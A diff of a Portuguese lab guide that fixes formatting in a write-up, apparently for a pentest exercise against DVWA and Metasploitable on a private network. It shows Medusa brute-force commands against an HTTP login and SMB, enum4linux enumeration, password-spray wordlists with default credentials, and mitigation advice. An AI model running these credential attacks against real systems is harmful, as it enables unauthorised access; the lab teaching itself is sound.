@@ -110,9 +110,9 @@ DVWA costuma ter login em /dvwa/login.php. Exemplo de uso do módulo http\_form 
 \# Exemplo genérico de http\_form (substitua os campos conforme o formulário real)
 
 ```bash
--m PAGE: medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \\
+-m PAGE: medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
 
--m FORM: 'username=^USER^\&password=^PASS^\&Login=Login' \\
+-m FORM: 'username=^USER^\&password=^PASS^\&Login=Login' \
 
 -m 'FAIL=Login failed' -t 6
 ```
@@ -133,20 +133,21 @@ Validação: tente fazer login no navegador usando as credenciais encontradas
 
 \# Enumeração com enum4linux
 
+```bash
 enum4linux -a 192.168.56.101 | tee enum4\_output.txt
-
+```
 
 
 \#Crie wordlists conforme ajuste:
 
 
-
+```bash
 echo -e "user\\nmsfadmin\\nservice" > smb\_users.txt
+```
 
-
-
+```bash
 echo -e "password\\n123456\\nWelcome123\\nmsfadmin" > senhas spray.txt
-
+```
 
 
 Medusa smbnt (sintaxe genérica — ajuste conforme versão):
@@ -155,8 +156,9 @@ Medusa smbnt (sintaxe genérica — ajuste conforme versão):
 
 \# Usando arquivo de usuários (-U) e uma pequena wordlist (-P)
 
+```bash
 medusa -h 192.168.56.101 -U smb\_users.txt -P senhas\_spray.txt -M smbnt -t 2 -T 50
-
+```
 
 
 * Os parâmetros -t 2 (threads) -T 50 (timeout em segundos)
@@ -167,9 +169,9 @@ medusa -h 192.168.56.101 -U smb\_users.txt -P senhas\_spray.txt -M smbnt -t 2 -T
 Validação: se houver credenciais válidas, usar smbclient para acesso:
 
 
-
+```bash
 smbclient -L //192.168.56.20 -U msfadmin
-
+```
 
 
 **Recomendações de mitigação (boas práticas):**
@@ -184,6 +186,7 @@ smbclient -L //192.168.56.20 -U msfadmin
 * Hardening: desabilitar serviços desnecessários; configurar FTP seguro (SFTP/FTPS) ou desativar FTP.
 * Whitelist de IPs para serviços administrativos, quando aplicável.
 * Educação: conscientizar sobre reutilização de senhas e engenharia social.
+
 
 
 
